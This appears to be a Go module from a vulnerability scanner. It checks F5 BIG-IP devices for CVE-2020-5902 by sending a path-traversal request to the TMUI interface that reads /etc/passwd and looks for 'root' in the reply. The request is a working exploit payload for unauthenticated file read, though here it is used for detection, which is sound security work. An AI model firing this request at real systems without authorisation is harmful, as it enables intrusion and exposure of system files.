package f5

import (
	"Predator/pkg/utils"
	"strings"
)

func CVE_2020_5902(u string) bool {
	if req, err := utils.HttpRequset(u+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "root") {
			return true
		}
	}
	return false
}
